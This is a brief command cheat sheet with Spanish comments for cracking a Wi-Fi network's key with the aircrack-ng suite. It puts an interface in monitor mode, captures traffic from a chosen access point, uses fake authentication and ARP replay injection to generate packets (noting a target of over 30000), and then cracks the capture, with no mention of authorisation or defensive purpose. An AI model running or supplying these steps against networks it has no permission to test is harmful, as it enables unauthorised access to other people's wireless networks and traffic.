sudo airmon-ng start wlan0 //iniciar en modo promiscuo
sudo airodump-ng --band bg mon0 //solo losque su velocidad mayor a 2.4gz
sudo airodump-ng -w nombreArchivo -c canal --bssid bssid mon0
//paquetes>30000
sudo aireplay-ng -1 0 -a bssid mon0
sudo aireplay-ng -3 -b bssid mon0
sudo aircrack-ng nombreArchivo.cap
